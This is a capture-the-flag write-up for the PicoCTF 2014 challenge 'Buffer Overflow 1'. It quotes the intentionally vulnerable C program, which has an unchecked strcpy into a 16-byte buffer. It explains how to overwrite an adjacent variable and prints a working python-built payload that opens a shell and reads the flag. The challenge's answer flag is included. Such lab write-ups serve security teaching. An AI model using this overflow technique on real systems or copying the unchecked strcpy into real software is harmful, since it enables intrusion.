# Pico-CTF 2014: Buffer Overflow 1

**Category:** Binary Exploitation
**Points:** 50
**Total Solves:** Not Available
## Problem Description:
[//]: # (Description of your problem. For eg use below description as a template)
[//]: # (> This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at /home/format/ on the shell server. The source can be found [here](format.c).)
> This problem has a buffer overflow vulnerability! Can you get a shell, then use that shell to read flag.txt? You can solve this problem interactively [here](https://picoctf.com/problem-static/binary/Overflow1/overflow1.html), and the source can be found [here](overflow1.c).

## Write-up
[//]: # (> Your write up goes here.)
> As the problem suggests it is a buffer overflow problem, looking at source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    int secret = 0;
    strcpy(buf, input);

    if (secret == 0xc0deface){
        give_shell();
    }else{
        printf("The secret is %x\n", secret);
    }
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
```

> We can see in the function vuln(char \*input) there is possibility of buffer overflow because strcpy() is copying into variable buf from variable input without checking input size. 
`char buf[16]` can store atmost 16 char including NULL, but strcpy will keep copying content from input to buf even if we provide more than 16 chars, it will store first 16 chars of input in buf then it will start writing on stack. 
Solution to get the flag is write `0xc0deface` in variable secret which will be just after the variable buf on stack, if we give input such that, of which first 16 chars are randomly anything but after that we give input what we want to write to secret whose hex value is`\xce\xfa\xde\xc0`, this is in reverse order because machine on which code is getting executed is little endian.

```
./overflow1 $(python -c 'print "A"*16+"\xce\xfa\xde\xc0"') 
$ id
uid=11066(pico1139) gid=1002(overflow1) groups=1017(picogroup)
$ cat flag.txt
ooh_so_critical
```

> Flag is **ooh_so_critical**

## Other write-ups and resources

* None
